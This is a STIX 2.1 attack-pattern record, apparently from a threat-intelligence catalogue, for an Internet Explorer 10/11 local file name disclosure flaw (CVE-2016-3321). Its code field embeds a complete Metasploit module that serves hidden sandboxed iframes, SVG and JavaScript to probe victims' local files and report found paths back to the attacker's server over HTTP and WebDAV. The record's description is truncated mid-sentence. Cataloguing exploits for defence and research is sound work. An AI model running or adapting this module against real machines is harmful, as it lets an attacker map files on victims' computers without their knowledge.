{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--74548d19-61d4-4dec-8979-665b4243d33e",
    "created": "2024-08-14T16:31:28.728286Z",
    "modified": "2024-08-14T16:31:28.72829Z",
    "name": "Internet Explorer Iframe Sandbox File Name Disclosure Vulnerability",
    "description": " It was found that Internet Explorer allows the disclosure of local file names. This issue exists due to the fact that Internet Explorer behaves different for",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ie_sandbox_findfiles.rb",
            "external_id": "ie_sandbox_findfiles.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3321"
        },
        {
            "source_name": "reference",
            "url": "https://securify.nl/advisory/SFY20160301/internet_explorer_iframe_sandbox_local_file_name_disclosure_vulnerability.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Internet Explorer Iframe Sandbox File Name Disclosure Vulnerability',\n      'Description'    => %q{\n        It was found that Internet Explorer allows the disclosure of local file names.\n        This issue exists due to the fact that Internet Explorer behaves different for\n        file:// URLs pointing to existing and non-existent files. When used in\n        combination with HTML5 sandbox iframes it is possible to use this behavior to\n        find out if a local file exists. This technique only works on Internet Explorer\n        10 & 11 since these support the HTML5 sandbox. Also it is not possible to do\n        this from a regular website as file:// URLs are blocked all together. The attack\n        must be performed locally (works with Internet zone Mark of the Web) or from a\n        share.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'Yorick Koster',\n      'References'     =>\n        [\n          ['CVE', '2016-3321'],\n          ['MSB', 'MS16-095'],\n          ['URL', 'https://securify.nl/advisory/SFY20160301/internet_explorer_iframe_sandbox_local_file_name_disclosure_vulnerability.html'],\n        ],\n      'Platform'       => 'win',\n      'DisclosureDate' => '2016-08-09'\n    ))\n\n    register_options(\n      [\n        OptString.new('SHARENAME', [ true, \"The name of the top-level share.\", \"falcon\" ]),\n        OptString.new('PATHS', [ true, \"The list of files to check (comma separated).\", \"Testing/Not/Found/Check.txt, Windows/System32/calc.exe, Program Files (x86)/Mozilla Firefox/firefox.exe, Program Files/VMware/VMware Tools/TPAutoConnSvc.exe\" ]),\n      ])\n\n    # no SSL\n    deregister_options('SSL', 'SSLVersion', 'SSLCert', 'SRVPORT', 'URIPATH')\n  end\n\n  def js\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n\n    %Q|function report() {\n  if(window.location.protocol != 'file:') {\n    try {\n      window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';\n    } catch (e) { }\n    return;\n  }\n\n  var frames = document.getElementsByTagName('iframe');\n  for(var i = 0; i < frames.length; i++) {\n  try {\n      if(frames[i].name == 'notfound') {\n        frames[i].src = 'http://#{my_host}/notfound/?f=' + frames[i].src;\n      }\n      else {\n        frames[i].src = 'http://#{my_host}/found/?f=' + frames[i].src;\n      }\n    } catch(e) { }\n  }\n}|\n  end\n\n  def html\n    frames = \"\"\n    datastore['PATHS'].split(',').each do |path|\n      frames = frames + \"<iframe src=\\\"file:///#{path.strip}\\\" onload=\\\"this.name='notfound'\\\" style=\\\"display:none;\\\" sandbox></iframe>\"\n    end\n\n    %Q|<!DOCTYPE html>\n<html>\n<head>\n<script type=\"text/javascript\">\n#{js}\n</script>\n</head>\n<body>\n#{frames}\n<script type=\"text/javascript\">\n  setTimeout('report();', 2000);\n</script>\n</body>\n</html>|\n  end\n\n  def svg\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n\n    %Q|<!-- saved from url=(0014)about:internet -->\n<svg width=\"100px\" height=\"100px\" version=\"1.1\" onload=\"try{ location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html'; } catch(e) { }\" xmlns=\"http://www.w3.org/2000/svg\"></svg>|\n  end\n\n  def is_target_suitable?(user_agent)\n    if user_agent =~ /^Microsoft-WebDAV-MiniRedir/\n      return true\n    end\n\n    info = fingerprint_user_agent(user_agent)\n    if info[:ua_name] == HttpClients::IE\n      return true\n    end\n\n    false\n  end\n\n  def on_request_uri(cli, request)\n    my_host  = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      unless is_target_suitable?(request.headers['User-Agent'])\n        print_status(\"GET #{request.uri} #{request.headers['User-Agent']} => 200 image.svg\")\n        resp = create_response(200, \"OK\")\n        resp.body = svg\n        resp['Content-Type'] = 'image/svg+xml'\n        resp['Content-Disposition'] = 'attachment;filename=image.svg'\n        cli.send_response(resp)\n      end\n\n      case request.uri\n      when /^\\/found\\/\\?f=/\n        f = URI.unescape(request.uri.gsub('/found/?f=', ''))\n        report_note(host: cli.peerhost, type: 'ie.filenames', data: f)\n        print_good(\"Found file \" + f)\n        send_response(cli, '')\n      when /^\\/notfound\\/\\?f=/\n        f = URI.unescape(request.uri.gsub('/notfound/?f=', ''))\n        print_error(\"The file \" + f + \" does not exist\")\n        send_response(cli, '')\n      when \"/\"\n        resp = create_response(200, \"OK\")\n        resp.body = %Q|<html>\n<head>\n<script type=\"text/javascript\">\n  try {\n    window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';\n  } catch (e) {\n    blob = new Blob([atob('#{Rex::Text.encode_base64(svg)}')]);\n    window.navigator.msSaveOrOpenBlob(blob, 'image.svg');\n  }\n</script>\n</head>\n<body>\n</body>\n</html>|\n\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n      else\n        print_status(\"GET #{request.uri} #{request.headers['User-Agent']} => 200 returning landing page\")\n        send_response(cli, html)\n      end\n    else\n      print_status(\"#{request.method} #{request.uri} => 404\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n    end\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    print_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    print_status(\"PROPFIND #{path}\")\n    body = ''\n\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    my_uri = \"http://#{my_host}/\"\n\n    if path !~ /\\/$/\n\n      if path.index(\".\")\n        print_status \"PROPFIND => 207 File (#{path})\"\n        body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n        # send the response\n        resp = create_response(207, \"Multi-Status\")\n        resp.body = body\n        resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n        cli.send_response(resp)\n        return\n      else\n        print_status \"PROPFIND => 301 (#{path})\"\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    print_status \"PROPFIND => 207 Directory (#{path})\"\n    body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n\n    if request[\"Depth\"].to_i > 0\n      trail = path.split(\"/\")\n      trail.shift\n      case trail.length\n      when 0\n        body << generate_shares(path)\n      when 1\n        body << generate_files(path)\n      end\n    else\n      print_status \"PROPFIND => 207 Top-Level Directory\"\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def generate_shares(path)\n    share_name = datastore['SHARENAME']\n%Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{share_name}/</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n  end\n\n  def generate_files(path)\n    trail = path.split(\"/\")\n    return \"\" if trail.length < 2\n\n    %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}index.html</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n  end\n\n  def gen_timestamp(ttype=nil)\n    ::Time.now.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n  end\n\n  def gen_datestamp(ttype=nil)\n    ::Time.now.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n  end\n\n  def run\n    datastore['URIPATH'] = '/'\n    datastore['SRVPORT'] = 80\n    exploit\n  end\nend\n",
    "x_mitre_contributors": [
        "Yorick Koster",
        ""
    ],
    "x_mitre_disclosure_date": "2016-08-09",
    "x_mitre_platforms": [
        "win'"
    ]
}